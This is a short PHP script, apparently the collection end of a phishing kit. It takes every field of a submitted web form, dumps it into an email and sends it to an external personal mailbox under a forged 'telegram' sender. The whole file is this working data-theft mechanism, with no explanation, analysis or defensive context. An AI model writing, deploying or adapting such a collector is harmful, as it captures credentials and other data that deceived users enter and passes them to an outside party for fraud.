<?php
$msg = var_export($_POST, 1);
mail('naveenkhanchandani@gmail.com', 'hello', $msg, 'From: telegram<telegram@calbabybar.com>');
echo 'hi';
?>